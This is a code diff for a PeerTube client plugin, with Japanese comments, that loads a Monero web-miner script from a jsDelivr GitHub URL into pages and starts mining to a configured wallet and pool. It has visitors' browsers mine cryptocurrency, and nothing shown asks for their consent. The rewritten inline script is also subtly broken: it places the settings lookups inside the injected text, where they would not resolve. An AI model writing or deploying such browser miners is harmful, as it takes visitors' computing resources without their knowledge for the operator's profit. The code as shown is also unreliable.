@@ -2,25 +2,41 @@ async function register({ registerHook, peertubeHelpers }) {
 
 peertubeHelpers.getSettings().then(
       s => {
-      let miner = "console.log('Initializing Monero miner client plugin...');\n"
+      console.log('Initializing Monero miner client plugin...')
       if ( !s || !s['walletAddress'] || !s['poolAddress']) {
-        let minerscript = "console.error('Monero miner plugin: Required settings are missing.');\n"
-        return
+        console.error('Monero miner plugin: Required settings are missing.');
+        return;
       }
 
-      let script = "<!-- Monero Miner Script -->"
-      minerscript+= "<script src='https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js'></script>\n"
-      minerscript+= "<script>\n"
-      minerscript+= "const server = '"+s['webSocket']+"';\n"
-      minerscript+= "const pool = '"+s['poolAddress']+"';\n"
-      minerscript+= "const wallet = '"+s['walletAddress']+"';\n"
-      minerscript+= "const workerId = 'PeerTube-Miner';\n"
-      minerscript+= "const threads = '"+s['threads']+"';\n"
-      minerscript+= "const password = '"+s['password']+"';\n"
-      minerscript+= "startMining(pool, wallet, workerId, threads, password);\n"
-      minerscript+= "throttleMiner = 20;\n"
-      minerscript+= "</script>;\n"
-      minerscript+= "<!-- End Of Mining Code (HTML) -->;\n"
+      // 外部スクリプトを挿入
+      const externalScript = document.createElement("script");
+      externalScript.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
+      externalScript.async = false;
+      document.head.appendChild(externalScript);
+
+      // 外部スクリプトのロード完了後に内部スクリプトを挿入
+      externalScript.onload = function() {
+        console.log("Mining script loaded successfully.");
+
+        const inlineScript = document.createElement("script");
+        // テンプレートリテラルとかいう反則じみた記述 知らなかった・・・
+        inlineScript.textContent = `
+            server = s['webSocket'];
+            var pool = s['poolAddress'];
+            var walletAddress = s['walletAddress'];
+            var workerId = "PeerTube-Miner";
+            var threads = s['threads'];
+            var password = s['password'];
+            startMining(pool, walletAddress, workerId, threads, password)
+            throttleMiner = 20;
+        `;
+        document.body.appendChild(inlineScript);
+        console.log("Mining started.");
+      };
+
+      externalScript.onerror = function() {
+        console.error("Failed to load the mining script.");
+      };
     }
   )
 }
